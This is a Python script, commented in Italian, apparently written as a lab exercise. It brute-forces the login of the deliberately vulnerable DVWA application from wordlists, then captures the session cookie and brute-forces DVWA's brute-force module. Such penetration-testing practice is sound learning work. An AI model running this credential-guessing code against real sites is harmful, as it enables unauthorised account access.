import requests

# URL di login
url = "http://192.168.50.101/dvwa/login.php"
user_cor = "" #user corretto
pwd_cor = "" #password corretta
username_file = "usernames.lst"
password_file = "passwords.lst"

#_____________________ INPUT ______________________________#
print("#################################################################")
appo = input("#\t\t\t\t\t\t\t\t#\n#\tInserisci dati richiesti o usa quelli di default\t#\n#\tDigita url target: ...")
if (appo != ""):
	url = appo

appo = input("#\tDigita path file nome utente:... ")
if (appo != ""):
	username_file = appo
	
appo = input("#\tDigita path file password:... ")
if (appo != ""):
	password_file = appo
	
lv_sicurezza=input("#\t\t\t\t\t\t\t\t#\n#\tDigita livello di sicurezza: low - medium - high\t#\n#\tDefault low: ")
print("#\t\t\t\t\t\t\t\t#\n#################################################################\n\n")
lv_sicurezza = lv_sicurezza.lower()
if (lv_sicurezza not in ("low", "medium", "high")):
	lv_sicurezza = "low"

#_____________________ FILE ______________________________#
username_file = open(username_file)
password_file = open(password_file)

usernames = username_file.readlines() #Creo liste con nomi
passwords = password_file.readlines() #Creo liste con password
	
username_file.close() #chiudo il file
password_file.close() 

#------------------------ BRUTE FORCE PAGINA HOME---------------------#
print("\tInizio brute force della pagina home di DVWA\n\tAttendere prego...\n\n")
for user in usernames:
	user = user.rstrip()
	for pwd in passwords:
		pwd = pwd.rstrip()
		#print(user, "-", pwd)
		data = {'username': user, 'password': pwd, 'Login': 'Login'}
		response = requests.post(url, data=data)
		if 'Welcome to Damn Vulnerable Web App!' in response.text:
			user_cor = user
			pwd_cor = pwd

print("#########################################################")
print(f"#\t\t\t\t\t\t\t#\n#\tLogin pagina home effettuato con successo\t#\n#\tNome utente: {user_cor} - Password: {pwd_cor}\t\t#\n#\t\t\t\t\t\t\t#")			
input("#########################################################\n\nPremi un tasto per continuare l'attacco...")

#------------------------ ACQUISIZIONE COOKIE--------------------#
# Dati di login
data = {'username': user_cor, 'password': pwd_cor, 'Login': 'Login'}

# Eseguo nuova richiesta con credenziali valide per ottenere il PHPSESSID
resonse = requests.post(url, data=data)

# Estrae il PHPSESSID dal cookie della risposta
#Cookie: security=high; PHPSESSID=1dd2d9bde2239de2e3c5228048fa2c08
phpsessid = resonse.request.headers.get('Cookie').split('; ')[1].split('=')[1]

print(f"Livello di sicurezza: {lv_sicurezza} - PHPSESSID: {phpsessid}")

#print(f"PHPSESSID ottenuto con successo: {phpsessid}\n")


#------------------------ COSTRUZIONE HEADER --------------------#
# Costruisce l'header con il PHPSESSID e il livello di sicurezza selezionato
if lv_sicurezza == "low":
	header = {"Cookie": f"security={'low'}; PHPSESSID={phpsessid}"}
elif lv_sicurezza == "medium":
	header = {"Cookie": f"security={'medium'}; PHPSESSID={phpsessid}"}
else:
	header = {"Cookie": f"security={'high'}; PHPSESSID={phpsessid}"}

#print (header)

#------------------------ BRUTE FORCE DVWA INERNA ---------------------#
for user in usernames:
	for password in passwords:
		url = "http://192.168.50.101/dvwa/vulnerabilities/brute/"
		user = user.strip()
		pwd = password.strip()
		get_data = {"username": user, "password": pwd, "Login": 'Login'}
		print("Test:   Utente: ", user," Password: ", pwd, "\n")

		r = requests.get(url, params=get_data, headers=header)
		if not 'Username and/or password incorrect.' in r.text:
			print("#########################################################")
			print(f"#\t\t\t\t\t\t\t#\n#\tAccesso riuscito con: \t\t\t\t#\n#\tUsername: {user}- Password: {pwd}\t\t#\n#\t\t\t\t\t\t\t#")	
			print("#########################################################")
			input("\nPremi invio per tornare al menù...")
			
			
			exit()
